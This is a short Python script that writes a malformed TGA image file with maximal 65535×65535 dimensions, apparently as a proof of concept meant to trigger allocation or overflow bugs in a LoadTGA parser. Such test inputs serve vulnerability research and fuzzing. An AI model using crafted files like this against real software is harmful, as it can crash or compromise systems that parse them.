from pathlib import Path
p=Path('/workspace/poc.tga')
# Try oversized dimensions to provoke allocation/overflow issues in LoadTGA.
header=bytearray(18)
header[2]=2
header[12]=0xff; header[13]=0xff  # width=65535
header[14]=0xff; header[15]=0xff  # height=65535
header[16]=24
header[17]=0x20
# add a tiny amount of pixel data to get past atEnd checks
p.write_bytes(header + b'\x00'*3)
print('wrote', p, p.stat().st_size)
